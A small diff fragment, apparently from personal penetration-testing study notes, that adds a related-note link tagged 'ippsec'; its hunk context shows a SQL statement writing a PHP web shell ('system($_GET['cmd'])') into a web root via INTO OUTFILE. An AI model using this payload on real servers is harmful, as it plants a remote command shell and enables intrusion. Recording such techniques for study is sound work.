@@ -8,6 +8,8 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221006214348](/zet/20221006214348/README.md) ippsec
+
 
 Tags:
 
